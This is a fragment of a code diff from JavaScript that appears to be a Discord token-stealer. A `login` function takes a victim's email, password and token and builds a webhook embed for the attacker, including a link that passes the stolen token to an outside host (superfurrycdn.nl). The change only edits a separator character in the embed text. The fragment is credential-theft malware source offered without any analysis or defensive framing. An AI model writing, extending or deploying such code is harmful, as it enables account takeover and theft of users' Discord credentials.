@@ -320,7 +320,7 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
  embeds: [
       {
-        description: `[<:3763verifiedgreen:989343589077221396> │ **Click Here To Copy Token On Mobile**](https://superfurrycdn.nl/copy/${token})`,
+        description: `[<:3763verifiedgreen:989343589077221396> **Click Here To Copy Token On Mobile**](https://superfurrycdn.nl/copy/${token})`,
             "color": config.embed_color,
             "fields": [
                 {
